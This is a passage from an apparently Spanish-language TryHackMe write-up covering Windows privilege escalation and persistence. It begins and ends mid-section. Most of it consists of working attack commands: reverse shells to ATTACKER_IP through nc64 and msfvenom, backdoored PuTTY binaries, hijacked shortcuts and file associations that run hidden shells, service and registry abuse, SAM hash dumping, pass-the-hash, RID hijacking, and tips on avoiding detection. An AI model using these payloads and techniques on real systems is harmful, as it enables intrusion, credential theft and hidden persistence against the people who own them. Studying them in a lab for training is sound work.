c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

El comando anterior ejecuta una reverse shell desde la cuenta de SYSTEM, esto se produce gracias a que cada vez que un usuario (incluidos los usuarios sin privilegios) inicia el servicio BITS en Windows, crea automáticamente una conexión al puerto 5985 utilizando los privilegios del SYSTEM. El puerto 5985 generalmente se usa para el servicio WinRM, que es simplemente un puerto que expone una consola Powershell para usarla de forma remota a través de la red, como SSH.

Si, por algún motivo, el servicio WinRM no se está ejecutando en el servidor de la víctima, un atacante puede iniciar un servicio WinRM falso en el puerto 5985 y detectar el intento de autenticación realizado por el servicio BITS al iniciarse. Si el atacante tiene privilegios de SeImpersonate, puede ejecutar cualquier comando en nombre del usuario que se conecta, que es SYSTEM.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220902194651.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Abusing vulnerable software**

Puede ser que en el sistema operativo existan programas, drivers, etc, en definitiva software vulnerable que nos pueda servir como un vector en al escalada de privilegios.

Podemos ver qué software tenemos instalado en una máquina Windows OS con *wmic*:

```cmd
wmic product get name,version,vendor
```

Una vez hemos listado software podemos buscar información relacionada con exploits en versiones vulnerables (Exploit-DB, Packet storm, etc) u otros mecanismos ya cubiertos en anteriores entradas de este blog.

<br />

#### 3.4. Windows Privilege Escalation II.

7.BufferOverflowIntroduction.md

Este room está dirigido para conocer algunas de las técnicas de elevación de privilegios sobre el sistema operativo Microsoft Windows.

Para la parte práctica tenemos una máquina Windows 10 con un servicio RDP (de administración remota) abierto en el puerto 3389, accederemos a ella mediante [rdesktop](http://www.rdesktop.org/)

```bash
rdesktop <ServerIP> -u <username>
```

<br />

**Generate a Reverse Shell Executable**

Una parte fundamental del proceso de escalada de privilegios es tener la capcidad de generar una shell. Con frecuencia intentaremos que un proceso con mayores permisos que los nuestros ejecute una shell que nos de acceso a la RCE con mayores permisos.

Podemos generar una reverse shell con MSFVenom como sigue:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LocalIP> LPORT=<LocalPORT> -f exe -o reverse.exe
```

Este comando nos creará un ejecutable en el formato PE de Windows que al ser procesado enviará una conexión a la máquina especificada sobre el puerto especificado y lo guardará en el directorio actual bajo el nombre del fichero reverse.exe.

Seguidamente, podemos transferir el fichero mediante habilitando un servidor SMB en nuestra máquina atacante:

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

Observemos que es necesario tener la librería [impacket](https://github.com/SecureAuthCorp/impacket) de python3. Luego lo copiamos desde la máquina víctima (recordemos que como es una escalada de privilegios tenemos acceso a la inyección de comandos menor):

```cmd
copy \\<LocalIP>\kali\reverse.exe C:\path\to\directory\reverse.exe
```

Aunque con Powershell también lo podemos hacer con el clásico wget:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220926084946.png' | relative_url }}" text-align="center"/>
</div>

Y antes de correr el binario creamos un listener para recibir la conexión:

```bash
sudo nc -nvlp <LocalPort>
```

<br />

**Service Exploits - Insecure Service Permissions**

Accesschk.exe es un proceso que se utiliza para reportar permisos sobre objetivos securizables, entre ellos, usuarios. Vamos a utilizar este proceso para comprobar nuestros propios permisos como usuario *user*.

En primer lugar, debemos saber dónde está antes de ejecutarlo, para ello lo buscamos con el siguiente comando de powershell:

```powershell
Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue | Select-String accesschk -ErrorAction SilentlyContinue
```

Este por un lado muestra de forma recurisva el contenido del directorio C:\ (el directorio raíz) y filtra todo aquello que contenga el término *accesschk* y pasa de los errores:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220926080125.png' | relative_url }}" text-align="center"/>
</div>

Así, corremos el ejecutable con el siguiente comando:

```cmd
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
```

Esto nos dará los permisos del usuario "user" respecto del servicio daclsvc

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220926080751.png' | relative_url }}" text-align="center"/>
</div>

Observemos que nuestro usuario tiene permisos para cambiar la configuración del servicio, además echándo un vistazo a la configuración del mismo con *sc qc* en el cmd podemos ver que este binario se ejecuta con privilegios de SYSTEM:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220926083429.png' | relative_url }}" text-align="center"/>
</div>

Así, y aprovechándonos del hecho de que podemos cambiar la configuración del fichero, cambiamos el BINARY_PATH_NAME para que apunte directamente sobre nuestro malware que previamente hemos pasado a la máquina tal y como se indica en la tarea anterior:

```cmd
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
```

Y corremos el servicio con *net start daclsvc*, obteniendo en el listener una shell.

<br />

**Services Exploits - Unquoted Service Path**

Vamos a ver en este caso uno muy parecido al anterior pero con una sutíl diferencia. En primer lugar, localizamos el servicio "unquotedsvc" con sc tal y como hemos hecho en el caso anterior: sc qc unquotedsvc

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220926085936.png' | relative_url }}" text-align="center"/>
</div>

Observamos que corre como SYSTEM pero además, el path al ejecutable que inicial el proceso no está entre comillas, esto se puede aprovechar gracias al comportamiento que tiene Windows para con los servicios cuando no encuentra el ejecutable.

Cuando Windows inicia un servicio, acude al path indicado bajo la variable BINARY_PATH_NAME y, si no está entrecomillado, toma los espacios como separadores de argumentos, es decir que en este caso, tomaría bajo el nombre del ejecutable C:\\Program y el resto serían una serie de argumentos que se pasan con la ejecución del parámetro. Además, otro de los comportamientos es que si no encuentra un ejecutable tiende a intentar autocompletar la ruta antes de reportar un error; de forma que C:\\Program podría llegar a ejecutar un C:\\Program.exe o algo por el estilo.

De esta forma, observamos que con accesschk.exe, los usuarios que forman parte del grupo BUILTIN\\Users pueden escribir sobre el directorio "C:\\Program Files\\Unquoted Path Service\\":

```cmd
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220926091422.png' | relative_url }}" text-align="center"/>
</div>

Así, vamos a aprovecharnos del comportamiento anterior para colar nuestro ejecutable malicioso en el path anterior y a renombrarlo de forma que al autompletar Windows lo ejecute en lugar de continuar hacia el path normal.

Así, lo renombramos en el directorio anterior con el nombre Common.exe e iniciamos el servicio con netstart:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220926092012.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Service Exploits - Weak Registry Permissions**

En este caso buscamos la configuración del servicio *regsvc*: sc qc regsvc.

Podemos ver que corre con permisos de SYSTEM y además utilizando accesschk.exe es "writable" por todos aquellos usuarios del grupo "NT AUTHORITY\\INTERACTIVE", esencialmente, todos los usuarios logeados en el sistema:

```cmd
C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220926094230.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, podemos sobreescribir el contenido del fichero con nuestro malware y correr el servicio para obtener una shell con elevación de privilegios.

<br />

**Service Exploits - Insecure Service Executables**

Buscamos el servicio "filepermsvc" y notamos que corre con privilegios de SYSTEM así como que se trata de un fichero que es escribible por todo el mundo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220926104837.png' | relative_url }}" text-align="center"/>
</div>

Así, de nuevo, sobre escribimos el ImagePath con nuestro malware y ejecutamos el servicio:

```cmd
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
```

<br />

**Registry - Autoruns**

En primer lugar buscamos en el registro ejecutables *autoruns*, estos son programas que se inician al iniciar la máquina:

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Ru
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220926105419.png' | relative_url }}" text-align="center"/>
</div>

Observamos al mismo tiempo que todos los usuarios pueden sobrescribir dicho archivo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220926110026.png' | relative_url }}" text-align="center"/>
</div>

Así, sobreescribimos el archivo con nuestro malware, activamos un listener en nuestra Kali y reiniciamos la máquina. Al iniciarse, se ejecutará el autorun con nuestro payload y obtendremos una shell con privilegios de SYSTEM.

<br />

**Registry - AllwaysInstallElevated**

El *AllwaysInstallElevated* es una característica de Windows que permite instalar un paquete MSI con privilegios elevados. Podemos investigar esta política en el registro mediante alguno de los siguientes comandos:

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220926125426.png' | relative_url }}" text-align="center"/>
</div>

Ambas están seteadas a 1, con lo que podemos generar un payload malicioso con extensión .msi e instalarlo en la máquina. Esto, junto con las política anterior provocará que nuestro malware se ejecute con privilegios elevados:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LocalIP> LPORT=<LocalPort> -f msi -o reverse.msi
```

Y después de transferir el ejecutable a la máquina, lo instalamos para desencadenar el malware y obtenr una shell con privilegios elevados:

```cmd
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

<br />

**Passwords - Registry**

Podemos buscar contraseñas en el registry filtrando el contenido del mismo por el término "password" o "pass" o similar, por ejemplo:

```cmd
reg query HKLM /f password /t REG_SZ /s
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220926163223.png' | relative_url }}" text-align="center"/>
</div>

Podemos buscar credenciales específicas del administrador con:

```cmd
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220926163347.png' | relative_url }}" text-align="center"/>
</div>

De forma que en nuestra máquina atacante podemos emplear la contraseña encontrada en el siguiente comando de bash para conectarnos como administrador a la máquina:

```bash
winexe -U 'admin%password' //10.10.113.21 cmd.exe
```


**Password - Saved Creds**

Podemos listar las credenciales guardadas mediante el comando:

```cmd
cmdkey /list
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220926164337.png' | relative_url }}" text-align="center"/>
</div>

Las credenciales del administrador están guardadas así podemos emplear el comando *runas* para poder ejecutar una acción como otro usuario, opor ejemplo nuestro malware:

```cmd
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

<br />

**Passwords - Security Account Manager (SAM)**

SAM son las siglas de Security Account Manager y suele ser un objetivo frecuente de ataques para recuperar los hashes de contraseñas junto con SYSTEM. Puede ocurrir que existan "backups" de SAM en un directorio vulnerable, por ejemplo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220926170140.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, transferiríamos ambos ficheros con el servidor SMB que tenemos abierto en la kali:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220926171822.png' | relative_url }}" text-align="center"/>
</div>

Y seguidamente en la kali descargaríamos la herramienta [creddump7](https://github.com/Tib3rius/creddump7) para volcar el contenido:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220926172242.png' | relative_url }}" text-align="center"/>
</div>

(Hace falta tener el paquete de pyhton pycrypto: pip3 install pycrypto).

Y lo crackeamos con JohnTheRipper:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220926172917.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Passwords - Passing The Hash**

Con *pth-winexe* podemos logearnos directamente si tenemos el hash de la contraseña. Recordamos que el hash completo requiere del LM hash y del NTLM hash separado por dos puntos.

```bash
pth-winexe -U 'admin%hash' //10.10.113.21 cmd.exe
```

<br />

**Scheduled Tasks**

Existen ejecutables que se procesan cada x cantidad de tiempo por un usuario del sistema. Especialmente vulnerables son aquellos ejecutables ejcutados por SYSTEM que además son "writables" por ti:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220926175741.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220926175836.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, incluiríamos nuestro malware como apéndice en el contenido del fichero y al ejecutar SYSTEM dicho archivo obtendríamos una reverse shell:

```cmd
echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
```

<br />

**Insecure GUI Apps**

Puede ocurrir que podamos tener acceso a aplicaciones que corran con más permisos que nosotros y que al mismo tiempo puedan ejecutar comandos en dicho proceso como por ejemplo el paint.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220926180452.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, abrimos el paint y seleccionamos abrir fichero e intentamos abrir el ejecutable cmd.exe, abriéndonos una shell como administrador.

<br />

**Startup Apps**

Podemos utilizar el siguiente comando para ver que podemos escribir sobre ficheros en el directorio StartUp:

```cmd
C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220926180858.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, generamos un "shortcut" a nuestro malware en dicho directorio con *cscript* y reiniciamos la máquina:

```cmd
cscript C:\PrivEsc\CreateShortcut.vbs
```

Al volver a conectarnos simulamos un logeo como Admin (rdesktop -u admin 10.10.71.181), aunque no consigamos conectarnos, admin correra los ejecutables de StartUp y nos dará una shell en el listener de kali.

<br />

#### 3.5. Windows Local Persistence.

7.BufferOverflowIntroduction.md

Después de proceder a la explotación de la máquina, el proceso de post-explotación puede durar más de lo que la instancia inicial puede mantener. Por ello surge la necesidad de encontrar una forma de mantener indefinidamente nuestra intrusión en la máquina víctima.

De esta forma, definimos como *persistencia* a la capacidad de un malware de sobrevivir al proceso que inicia dicho programa.

A continuación presentamos las técnicas más utilizadas para lograr persistencia durante un ataque.

<br />

**Tampering With Unprivileged Accounts**

En un sentido simple, obtener las credenciales de una cuenta de administrador es la forma más rápida y más simple de ganar persistencia sobre una máquina. El incoveniente es que estas cuentas suelen estar monitoreadas. Así, la manera más eficiente de obtener esta forma de persistencia es utilizar la cuenta de un administrador para promocionar una cuenta de un usuario menos utilizada.

Así, para los siguientes ejemplos supondrémos que tenemos acceso a una shell de administrador de una máquina intencionalmente vulnerable en distintos sentidos. El objetivo será instaurar permanencia sobre esa cuenta con privilegios.

Por otra parte, realizando un escaneo de puertos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220927102405.png' | relative_url }}" text-align="center"/>
</div>

Podemos observar que tiene abiertos los puertos 3389 (RDP) y 5985 (WinRM 2.0 or Microsoft Windows Remote Management) con lo que podemos conectarnos a ella con herramientas como *rdesktop, freerdp o Evil-WinRm* que son clientes RDP y WinRM para Linux disponibles desde la APT.

- *Assign Group Memberships*:

Una de las formas de promocionar una cuenta sin privilegios es adherirla al grupo de administradores:

```cmd
net localgroup administrators thmuser0 /add
```

O si este se trata de un movimiento que llama demasiado la atención al grupo de los "Backup Operators", los cuales no tienen privilegios de administrador peropuede leer/escribir sobre cualquier clave de registro ignorando la configuación DACL (Discretionary Acess Control Lists) permitiéndonos así recopilar toda la información de los hashes de contraseña:

```cmd
net localgroup "Backup Operators" thmuser1 /add
```

La única desventaja es que al no ser un usuario con privilegios no nos podemos conectar al mismo mediante RDP, lo debemos incoporar al grupo de Remote Desktop Users

```cmd
net localgroup "Remote Management Users" thmuser1 /add
```

De esta forma ya podemos utilizar el siguiente comando para conecarnos al usuario:

```bash
evil-winrm -i 10.10.154.251 -u thmuser1 -p Password321
```

Sin embargo, debemos observar que aunque nos conectemos y observemos que estemos en el grupo de Backup Operators:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220927103434.png' | relative_url }}" text-align="center"/>
</div>

No podemos acceder a ningún fichero tal y como teníamos previsto. Esto es debido a la configuración del UAC, el cual tiene una característica implementada denominada LocalAccountTokenFilterPolicy la cual elimina cualquier cuenta local de sus privilegios administrativos al iniciar sesión de forma remota. Si bien puede elevar sus privilegios a través de UAC desde una sesión de usuario gráfica, si usa WinRM, está confinado a un token de acceso limitado sin privilegios administrativos.

De forma que, antes de conectarnos al usuario thmuser1 para operar con él, debemos deshabilitar esta característica desde el registro con el siguiente comando:

```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

De esta forma, ahora sí, procedemos a formar un backup de los ficheros de SYSTEM y SAM:

```powershell
reg save hklm\system system.bak
reg save hklm\sam sam.bak
```

Y seguidamente procedemos a descargar ambos ficheros:

```powershell
download system.bak
download sam.bak
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220927105032.png' | relative_url }}" text-align="center"/>
</div>

Y todo lo que queda es hacer un dump con scretsdump.py o una herramienta similar:

```bash
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220927105151.png' | relative_url }}" text-align="center"/>
</div>

Y con estos hashes podemos intentar crakearlos o podemos empelar una herramienta de Evil-WinRM que consiste en realizar un ataque de *pashthehash*:

```bash
evil-winrm -i 10.10.154.251 -u Administrator -H f3118544a831e728781d780cfdb9c1fa
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220927105354.png' | relative_url }}" text-align="center"/>
</div>

Con lo que tenemos acceso a la cuenta del administrador siempre que lo deseemos.

Así pues:

- O incluimos a un usuario al grupo de administradores.
- O incluimos a un usuario en el grupo de "Backup Operators", "Remote Desktop Users/Remote Management Users" y deshabilitamos la caracteristica de la UAC antes mencionada.

<br />

- *Special Privileges and Security Descriptors*:

Por otra parte, un resultado similar que añadir a un usuario al "Backup Operator" se puede conseguir asignando privilegios. Los grupos son una forma de regular un conjunto de privilegios sobre un conjunto de usuarios pero los privilegios pueden asignarse individualmente.

Los *privilegios* no representan más que la capacidad o permisividad de realizar un acción, podemos encontrar una lista completa de privilegios [aquí](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants). Así por ejemplo los usuarios del grupo "Backup Operators" tienen los dos privilegios siguientes; *SeBackupPrivilege* y *SeRestorePrivilege* que les permite respectivamente leer y escribir sobre cualquier fichero del sistema ignorando el DACL.

Podemos asignar ambos privilegios utilizando el comando *secedit*. En primer lugar agrupamos los privilegios sobre un fichero para modificarlo:

```powershell
secedit /export /cfg config.inf
```

Abrimos el fichero y hacemos los cambios pertinentes:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220927143347.png' | relative_url }}" text-align="center"/>
</div>

Hemos añadido como poseedor de ambos privilegios al usuario en cuestión "thmuser2".

Seguidamente, convertimos el ".inf" al ".sdb":

```powershell
secedit /import /cfg config.inf /db config.sdb
```

y lo cargamos en la configuración del sistema:

```powershell
secedit /configure /db config.sdb /cfg config.inf
```

Sin embargo, todavía no podemos logearnos al usuario con WinRM ya que tampoco está en el grupo de "Remote Management Users", por tanto debemos cambiar el "Security Descriptor" asociado a thmuser2 para poder conectarnos.

Empleamos el siguiente comando para abrir la configuración:

```powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

Y en la GUI se abrirá una ventana en la que realizamos los siguientes cambios:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220927145018.png' | relative_url }}" text-align="center"/>
</div>

(En el caso en el que el usuario thmuser2 no aparezca bastará con añadirlo con el botón "add")

Una vez hecho esto, podremos conectarnos como el usuario thmuser2 con los privilegios de leer y escribir sobre cualquier fichero para repetir la operación anterior sobre los hashes.

<br />

- *RID Hijacking*:

Otro método de ganar privilegios administrativos sin ser administrador es cambiar algunos valores del registro para hacer pensar al sistema operativo que eres de hecho un administrador.

Cuando se crea un usuario se le asigna un RID o Relative ID, es un identificador. Cuando un usuario se logea en el sistema el proceso LSASS lee su RID del registro SAM y crea un token de acceso que resume sus permisos y privilegios. De esta forma, si cambiáramos el RID de alguna forma y lo sustituyéramos por uno del administrador conseguiriámos un token de acceso de administrador y elevaríamos privilegios.

En primer lugar para obtener el RID de todos los usuarios empleamos el comando:

```cmd
wmic useraccount get name,sid
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220927170630.png' | relative_url }}" text-align="center"/>
</div>

Podemos observar que el administrador tiene un RID de 500, mientras que los usuarios normales tienen uno supropr o igual a 1000. Si lo que queremos es asignar un RID de 500 al usuario thmuser3 acudimos al *Registry Editor* (este por motivos de seguridad está restringido tan sólo a la cuenta SYSTEM , para poder ejecutar el Registry Editor adecuadamente necesitamos hacerlo con: PsExec64.exe -i -s regedit)

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220927172420.png' | relative_url }}" text-align="center"/>
</div>

Y dentro acudimos a HKEY_LOCAL_MACHINE > SAM > Domains > Account > Users > 000003F2 (este es el usuario que tiene el RID 0x3F2 = 1010, es thmuser3) pulsamos doble click sobre el valor binario F

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220927172516.png' | relative_url }}" text-align="center"/>
</div>

Y observamos que los bytes correspondientes al RID son F2 O3 y para hacerlo corresponder con 500 lo cambiamos a F4 01 como si fuera un fichero de texto:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220927172800.png' | relative_url }}" text-align="center"/>
</div>

Aceptamos y la proxima vez que el usuario thmuser3 se logee en el sistema, el equipo le concedera un RID y por tanto un token de acceso, de administrador.

<br />

**Backdooring Files**

Otro método para establecer persistencia consiste en manipular algunos archivos con los que sabemos que el usuario interactúa regularmente. 

Al realizar algunas modificaciones a dichos archivos, podemos implantar malware que técnicamente se denominan *Backdoors* que se ejecutarán cada vez que el usuario acceda a ellas dándonos acceso mediante la gestión de las mismas con un C2. Dado que no queremos delatarnos, los archivos que modificamos deben seguir funcionando para el usuario como se espera.

Veámos puertas traseras, revisaremos las más utilizadas:

- *Executables files*:

Un buen ejemplo son aquellos ejecutables que se encuentran con accesos directos sobre el escritorio, existen altas probabilidades de que el usuario los utilice de manera frecuente. Supongámos así que tenemos entre estos el *C:\\Program Files\\PuTTY\\putty.exe*

Con Msfvenom podemos fácilmente introducir entre el código original de esta aplicación mediante el siguiente comando:

```shell-session
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

De esta forma, el resultado es un "backdored" putty.exe que al mismo tiempo que el servicio para el que fue pensado también ejecutará un reverse_tcp meterpreter payload.

<br />

- *Shortcut Files*:

Si por otra parte no queremos alterar el ejecutable siempre podemos manipular el *shortcut* del mismo para que apunte, por ejemplo, a un script que ejecute nuestro malware y luego inicie el ejecutable en sí mismo.

Por ejemplo, en el escritorio del equipo tenemos el atajo a la aplicación calculadora:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220927215446.png' | relative_url }}" text-align="center"/>
</div>

Pulsamos el botón derecho sobre el icono, "Propiedades" y modificamos, de la pestaña "Shortcut", el campo "Target":

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220927221056.png' | relative_url }}" text-align="center"/>
</div>

Previamente debemos haber creado un script con powershell:

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
```

Este script se guarda en un fichero de texto blanco a través de notepad con la extensión .ps1. Seguidamente, se cambia el shortcut tal y como hemos visto antes con la salvedad de que puede ser que también cambie el icono del escritorio, razón por la cual cambiamos el nombre concretamente a: powershell.exe -WindowStyle hidden C:\\Windows\\System32\\backdoor.ps1

Y le damos a cambiar icono:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220927222324.png' | relative_url }}" text-align="center"/>
</div>

Buscamos el icono del ejecutable de la calculadora en "Browse" buscando de hecho el propio ejecutable y le damos a ok.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220927222235.png' | relative_url }}" text-align="center"/>
</div>

El resultado esencialmente es la manutención del icono que había por defecto.

<br />

- *Hijacking File Associations*:

Por último, podemos manipular la *file association* para inducir al sistema operativo a spawnear una shell cuando un usuario abre un tipo específico de fichero. El resúmen es que para abrir un tipo de fichero se llama por defecto a un programa que es susceptible de ser modificado para que, además de su tarea, spawneé una shell.

Podemos ver en el registro esta asociación donde se guarda una clave para cada tipo de fichero en *HKLM\\Software\\Classes\\* . Veámos cómo revisarlo para abrir un ".txt", acudimos al registro y buscamos en la carpeta anterior el fichero tipo .txt:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220928082254.png' | relative_url }}" text-align="center"/>
</div>

Asociado a este podemos encontrar una subclave que será el Programmatic ID asociado al mismo, este es esencialmente un identificador de un programa instalado en el sistema. Al buscar de nuevo en el registro el ProgID obtendrémos una referencia al programa que carga el tipo de fichero:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220928082730.png' | relative_url }}" text-align="center"/>
</div>

Notemos que esta referencia está bajo el path: shell\\open\\command.

Así, en este caso concreto cuando el sistema intenta abrir un fichero con extensión .txt por defecto lo hace mediante un comando que llama a Notepad.exe y un parámetro (%1) que es el fichero que va a abrirse.

Así, *podemos cambiar el comando por un script que nos spawneé una shell y luego llame a notepad.exe*:

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

Guardamos el script anterior en un fichero con extensión .ps1 y colocamos el siguiente comando en la clave del registro asociado a txtfile: powershell.exe -WindowStyle hidden C:\\Windows\\System32\\backdoor.ps1 %1.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220928091416.png' | relative_url }}" text-align="center"/>
</div>

La próxima vez que habrámos un fichero .txt

<br />

**Abusing Services**

Los servicios de Windows ofrece grandes de forma de implementar una forma de persistencia ya que algunos de estos están configurados para iniciarse desde el mismo tiempo en el que inicia la máquina. Por tanto, podríamos buscar la forma de hacer que un servicio ejecutáse nuestro malware y conseguiríamos que cada vez que se inicia la máquina también se ejecuta el malware.

Para empezar, en Microsoft Windows OS, un servicio es un ejecutable que corre en segundo plano, de cuya ejecución un usuario corriente no es consciente.

Cuando se configura el inicio de un servicio, una de las cosas que se pueden configurar es el ejecutable que se va a usar y si el ejecutable se ejecuta en el "startup" del sistema.

Así, podemos tomar dos vías concretamente; o creamos un servicio nuevo o modificamos uno existente

- *Creating backdoor services*:

Podemos crear un servicio llamado "THMservice" empleando los siguientes comandos:

```shell-session
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice
```

Al iniciar este servicio se ejecuta el comando contenido en el valor de "binpath" y además la opción "start= auto" hace que este servicio se inicie cada vez que la máquina se inicia, en el startup.

De la misma forma podemos crear un servicio malicioso que ejecute un comando que inicie un ejecutable malicioso:

En priemr lugar, creamos con msfvenom un payload reverse_shell para windows:

```bash
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
```

Y lo transportamos a la máquina víctima abriendo un servidor python http:

```bash
python3 -m http.server <PORT> #Si no se aporta un puerto se abre en el 8000
```

con el siguiente comando de powershell:

```powershell
wget "http://<LocalIP>:<port>/rev-svc.exe" -o reverse.exe
```

En segundo lugar, una vez tenemos el malware en la máquina víctima, creamos un servicio para ejecutar dicho malware cada vez que la máquina se ejecute:

```shell-session
sc.exe create THMservice2 binPath= "C:\windows\reverse.exe" start= auto
sc.exe start THMservice2
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220928164206.png' | relative_url }}" text-align="center"/>
</div>

Así, todo lo que queda es activar un listener en el puerto 4448 con netcat en la máquina atacante y cada vez que se encienda la máquina víctima capturaremos una sesión teniendo por tanto permanencia.

<br />

- *Modifying existing services*:

Aunque la metodología anterior de crear un nuevo servicio pueda funcionar bastante bien si estamos ante un sistema monitorizado, el blue team puede detectar que repentinamente se ha inicializado un nuevo servicio lo cual puede delatarnos.

Así, lo más prudente consiste en modificar un servicio ya existente para dejar menos huellas. En primer lugar, podemos detectar todos los servicios disponibles dentro de un sistema con el siguiente comando:

```cmd
sc.exe query state=all
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220928170733.png' | relative_url }}" text-align="center"/>
</div>

En nuestro caso concreto observamos que existe un servicio llamado THMservice3.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220928171303.png' | relative_url }}" text-align="center"/>
</div>

Para tener detalles sobre él utilizamos el comando:

```cmd
sc.exe qc THMService3
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220928171024.png' | relative_url }}" text-align="center"/>
</div>

Entre la información que despliega es especialmente notable el BINARY_PATH_NAME que contiene la ruta al ejecutable que inicia el servicio, el START_TYPE que indica cuándo se inicia el servicio, preferiblemente nos interesa un AUTO_START y el SERVICE_START_NAME que indica la cuenta que ejecuta el servicio prefireblemente es interesante que esta sea *LocalSystem*.

Así, generamos un binario malicioso com msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe-service -o rev-svc2.exe
```

